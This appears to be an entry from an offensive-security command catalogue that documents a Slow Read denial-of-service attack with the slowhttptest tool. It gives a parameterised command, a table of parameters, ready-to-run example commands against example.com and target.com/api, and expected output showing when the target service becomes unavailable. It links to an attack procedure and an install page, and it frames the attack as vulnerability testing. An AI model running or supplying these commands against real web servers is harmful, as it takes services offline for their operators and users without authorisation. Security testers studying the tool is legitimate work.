---
id: d4363222-2d56-4a3a-a783-5bf14ca8ffc3
name: slowhttptest-slow-read-dos
type: command
executor: bash
data: >-
  slowhttptest -c $_CONNECTIONS -H -g -o $_OUTPUT_FILE -i $_INTERVAL -r $_RATE
  -t $_VERB -u $_URL -x $_READ_INTERVAL -p $_PROBE_TIMEOUT
output: null
created_at: '2020-09-06T18:43:30.675561+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - DoS
  - web
verified: true
validated: true
---

# slowhttptest-slow-read-dos

## Command

```bash
slowhttptest -c $_CONNECTIONS -H -g -o $_OUTPUT_FILE -i $_INTERVAL -r $_RATE -t $_VERB -u $_URL -x $_READ_INTERVAL -p $_PROBE_TIMEOUT
```

## Description

This command runs slowhttptest in Slow Read mode to perform a DoS attack by establishing multiple connections to a target web server and slowly reading HTTP responses, exhausting server resources. Use it to test for vulnerabilities in web applications that lack proper connection handling.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-c $_CONNECTIONS` | Number of connections to establish (e.g., 500) | Yes |
| `-H` | Enables SlowLoris mode for unfinished requests (optional for Slow Read) | No |
| `-g` | Generates CSV and HTML report files with timestamps | No |
| `-o $_OUTPUT_FILE` | Custom output filename for reports (e.g., ./output_file) | No |
| `-i $_INTERVAL` | Interval between follow-up data in seconds (e.g., 10) | Yes |
| `-r $_RATE` | Connection rate per second (e.g., 200) | Yes |
| `-t $_VERB` | HTTP verb to use (e.g., GET) | Yes |
| `-u $_URL` | Target URL or IP (e.g., http://example.com) | Yes |
| `-x $_READ_INTERVAL` | Enables Slow Read mode with read interval in bytes (e.g., 24) | Yes |
| `-p $_PROBE_TIMEOUT` | Probe connection timeout in seconds before marking DoS (e.g., 2) | Yes |

## Examples

### Basic Usage

```bash
slowhttptest -c 500 -H -g -o ./output_file -i 10 -r 200 -t GET -u http://example.com -x 24 -p 2
```

### Advanced Usage

```bash
slowhttptest -c 1000 -g -o dos_report -i 5 -r 100 -t POST -u https://target.com/api -x 10 -p 5
```

(Adjust for higher load or HTTPS targets; note HTTPS may require additional setup.)

## Expected Output

slowhttptest version 1.6
 - https://code.google.com/p/slowhttptest/ -
test type:                        SLOW READ
number of connections:            500
URL:                              http://example.com
verb:                             GET
interval between follow up data:  10 seconds
connections per seconds:          200
read interval:                    24 bytes
probe connection timeout:         2 seconds

slow HTTP test status on 0th second:

initializing:        0
pending:             500
connected:           0
error:               0
closed:              0
service available:   Yes

(Progress updates show increasing connected/pending connections; service available flips to No when DoS is effective. Reports saved to specified files.)

## Related

- [[procedures/Slow-Read-DoS-Attack]]
- [[commands/install-slowhttptest-on-ubuntu]]
